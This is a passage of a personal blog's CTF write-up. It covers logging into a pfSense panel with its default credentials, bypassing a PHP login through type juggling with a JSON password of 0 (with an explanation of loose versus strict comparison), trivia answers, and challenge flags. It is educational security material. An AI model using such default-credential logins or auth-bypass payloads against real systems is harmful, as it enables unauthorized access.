+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>flag<span style="color:#719e07">{</span>b0l0_r31_FTW<span style="color:#719e07">}</span>
+</span></span></code></pre></div><h2 id="web">Web<a hidden class="anchor" aria-hidden="true" href="#web">#</a></h2>
+<h3 id="the-folt">The Folt<a hidden class="anchor" aria-hidden="true" href="#the-folt">#</a></h3>
+<p><em>&ldquo;pfSense is a free and open-source firewall and router software distribution based on the FreeBSD operating system. It is designed to provide a flexible and powerful platform for building and managing network infrastructure, and it includes a wide range of features and capabilities that are suitable for use in both small and large networks. Have a try <a href="http://machine.armysi.cc/%22">http://machine.armysi.cc/&quot;</a></em></p>
+<p>The URL redirected to a pfsense login menu so I just searched for the default creds for the pfsense login menu and found <code>admin:pfsense</code> and that got me the first flag</p>
+<p><img alt="image" loading="lazy" src="https://user-images.githubusercontent.com/12052283/209363467-7f963216-8c1f-4b0c-a168-0e8124066a09.png"></p>
+<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>flag<span style="color:#719e07">{</span>Default?_More_Like_Badfault<span style="color:#719e07">}</span>
+</span></span></code></pre></div><h3 id="in-passwords-we-trust-and-in-php-we-believe">In Passwords, We Trust, and in PHP, We Believe!<a hidden class="anchor" aria-hidden="true" href="#in-passwords-we-trust-and-in-php-we-believe">#</a></h3>
+<p><em>&ldquo;Great, another admin panel, do you think you can crack it? (<a href="https://santa.sefod.eu/)%22">https://santa.sefod.eu/)&quot;</a></em></p>
+<p>We are presented with a login page that is written in PHP.</p>
+<p><img src="https://user-images.githubusercontent.com/12052283/209546349-10555cbe-2e83-4ebb-8ccf-843a9a9346bb.png"  style="display: block;
+margin-left: auto;
+margin-right: auto;
+width: 70%;"></p>
+<p>After going to the source code we have the php logic of the login menu.</p>
+<p><img src="https://user-images.githubusercontent.com/12052283/209546448-cc4a9e71-b222-467a-b249-32292062f462.png"  style="display: block;
+margin-left: auto;
+margin-right: auto;
+width: 70%;"></p>
+<p>We can see that to get the flag we need to have the user == &ldquo;admin&rdquo; and the password must be the same as the generated token.</p>
+<p>We can see too (in the second elseif) that if the passwordis empty we got our token but this is kinda useless as we cant use that token to the next login because it will get generated again.</p>
+<p><img alt="image" loading="lazy" src="https://user-images.githubusercontent.com/12052283/209546845-389b24fa-8779-443f-93ad-d59758f16dda.png"></p>
+<p>I&rsquo;ve noticed a strange thing, why would they use <code>$answer</code> as a json decode of <code>$input</code> ? After this they use the <code>$password</code> var to extract the value of the json object so the vuln/bug must reside here because this is not normal at all.</p>
+<p>After googling I&rsquo;ve found this <a href="https://security.stackexchange.com/a/63326">https://security.stackexchange.com/a/63326</a> so this was php type juggling.</p>
+<p>Ill explain better what php type juggling is in another section but the basic idea is that this code uses <code>json_decode()</code> so we can specify a type other than string or array via the JSON object and we know that the type of the $token is a string because its Base64-encoded. Knowing this I tried to find a value that, when loosely compared to a string (because they are using <code>==</code> and not <code>===</code>), lets me pass the auth check.</p>
+<ul>
+<li>Checking the PHP equality charts, we can see that <code>0 == &quot;xyz&quot;</code> is true, so I passed the value 0 as password (<code>{&quot;password&quot;: 0}</code>) and got the flag.</li>
+</ul>
+<p><img alt="image" loading="lazy" src="https://user-images.githubusercontent.com/12052283/209556933-3e661acd-9e40-4edf-9617-654cecc2a3ba.png"></p>
+<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>flag<span style="color:#719e07">{</span>OnceAgainTypeJuggling<span style="color:#719e07">}</span>
+</span></span></code></pre></div><h4 id="in-deep-explanation-about-php-type-juggling">In deep explanation about PHP Type Juggling<a hidden class="anchor" aria-hidden="true" href="#in-deep-explanation-about-php-type-juggling">#</a></h4>
+<ul>
+<li>
+<p>In PHP we have loose (<code>==</code>) and strict comparison (<code>===</code>)</p>
+</li>
+<li>
+<p>The loose comparison is used to check if the given values are equal or not.</p>
+</li>
+<li>
+<p>The strict comparison checks if the given values are equal and if the data types are the same</p>
+</li>
+<li>
+<p>Reading the php docs about this we have that <code>Prior to PHP 8.0.0, if a string is compared to a number or a numeric string then the string was converted to a number before performing the comparison</code></p>
+<p><img src="https://user-images.githubusercontent.com/12052283/209557451-549f8d65-4851-4517-a164-58585d8b9a71.png"  style="display: block;
+margin-left: auto;
+margin-right: auto;
+width: 70%;"></p>
+</li>
+<li>
+<p>Knowing this when we try to attack a PHP application by using a type juggling flaw, we try to exploit this type of unexpected behavior the developers did not think about</p>
+</li>
+<li>
+<p>In the CTF example we had this flaw because they were using <code>==</code> to compare a given password with a string (base64 token).</p>
+</li>
+<li>
+<p>Knowing the type of the password, we had to find a value that when compared to a string returned <code>true</code> and after checking php equality charts, we can see that <code>0 == &quot;xyz&quot;</code> is true, so we could just use <code>{&quot;password&quot;:0}</code> because that would compare with the generated token and return true</p>
+</li>
+<li>
+<p>This could be prevented using <code>===</code></p>
+</li>
+</ul>
+<h2 id="trivia">Trivia<a hidden class="anchor" aria-hidden="true" href="#trivia">#</a></h2>
+<h3 id="who">Who?<a hidden class="anchor" aria-hidden="true" href="#who">#</a></h3>
+<p><img src="https://user-images.githubusercontent.com/12052283/209370539-5baf80b1-64cd-4da5-a079-d13731682f5b.png"  style="display: block;
+margin-left: auto;
+margin-right: auto;
+width: 40%;"></p>
+<p>This was an easy one, just searching the image on google we got the flag <code>lulzsec</code>.</p>
+<h3 id="the-great-hack">The Great Hack<a hidden class="anchor" aria-hidden="true" href="#the-great-hack">#</a></h3>
+<p><em>&ldquo;How about ensuring that you are a guaranteed winner of a radio contest by controlling all the telephone lines? Imagine, what a classy hack that would be. It took place in real world and the hacker won a costliest prize. What was the costliest prize that the hacker won?&rdquo;</em></p>
+<p>I searched in google for &ldquo;hacker win radio contest by controlling all the telephone lines&rdquo; and got an <a href="https://www.industrialcybersecuritypulse.com/threats-vulnerabilities/throwback-attack-kevin-poulsen-wins-a-porsche-and-hacks-the-u-s-government/#:~:text=A%2025%2Dyear%2Dold%20hacker,Peters.">article</a> that said &ldquo;It was June 1, 1990, and KIIS-FM was running a competition for callers to win a new Porsche 944 S2&rdquo;.</p>
+<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Porsche <span style="color:#2aa198">944</span> S2
+</span></span></code></pre></div><h1 id="final-result">Final result<a hidden class="anchor" aria-hidden="true" href="#final-result">#</a></h1>
+<p>It was a really fun CTF to learn a few neat tricks and it was even cooler for the fact that it came in 2nd place!</p>
+<p><img src="https://user-images.githubusercontent.com/12052283/219755447-101dc861-482b-4b1d-ad2b-fbaac7b2d066.png"  style="display: block;
+margin-left: auto;
+margin-right: auto;
+width: 80%;"></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/tags/ctf/">CTF</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="http://localhost:1313/">Bruno Blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
